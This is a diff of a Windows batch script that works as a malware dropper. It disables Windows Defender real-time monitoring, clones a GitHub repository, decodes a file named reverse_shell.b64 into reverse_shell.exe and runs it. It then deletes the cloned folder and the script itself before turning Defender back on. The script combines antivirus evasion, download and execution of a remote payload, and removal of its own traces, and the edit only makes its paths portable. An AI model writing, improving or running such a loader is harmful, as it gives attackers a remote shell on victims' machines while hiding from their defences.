@@ -1,10 +1,16 @@
 @echo off
+REM Disable Windows Defender temporarily
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-REM Define the paths
+
+REM Get the current script directory
+set "scriptDir=%~dp0"
+set "scriptDir=%scriptDir:~0,-1%"
+
+REM Define the paths relative to the script directory
 set "repoUrl=https://github.com/nithin434/stuff2.git"
-set "repoDir=C:\stuff2"
+set "repoDir=%scriptDir%\stuff2"
 set "b64File=%repoDir%\reverse_shell.b64"
-set "exeFile=C:\reverse_shell.exe"
+set "exeFile=%scriptDir%\reverse_shell.exe"
 
 REM Clone the repository
 git clone "%repoUrl%" "%repoDir%"
@@ -27,9 +33,11 @@ if %errorlevel% neq 0 (
 REM Execute the decoded executable
 start "" "%exeFile%"
 
-REM Optionally, you can delete the repository folder and the batch script after execution
+REM Optionally, delete the repository folder and the batch script after execution
 rmdir /s /q "%repoDir%"
 del "%~f0"
+
+REM Re-enable Windows Defender
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
 
 REM End of script
